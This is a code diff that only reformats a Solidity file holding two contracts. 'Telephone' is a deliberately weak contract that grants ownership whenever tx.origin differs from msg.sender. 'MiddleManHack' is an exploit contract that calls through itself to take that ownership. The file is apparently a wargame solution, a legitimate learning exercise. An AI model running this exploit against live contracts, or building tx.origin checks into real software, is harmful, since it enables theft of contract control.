@@ -2,32 +2,29 @@
 pragma solidity ^0.8.0;
 
 contract Telephone {
+    address public owner;
 
-  address public owner;
-
-  constructor() {
-    owner = msg.sender;
-  }
-
-  function changeOwner(address _owner) public {
-    if (tx.origin != msg.sender) {
-      owner = _owner;
+    constructor() {
+        owner = msg.sender;
     }
-  }
+
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
+    }
 }
 
-
-contract MiddleManHack{
-
+contract MiddleManHack {
     address private _owner;
-    
-    constructor(){
+
+    constructor() {
         _owner = msg.sender;
     }
 
-    function hack(address _tel) public{
+    function hack(address _tel) public {
         (bool success, ) = _tel.call(
-          abi.encodeWithSignature("changeOwner(address)", _owner)
+            abi.encodeWithSignature("changeOwner(address)", _owner)
         );
 
         require(success, "Hack is not success");
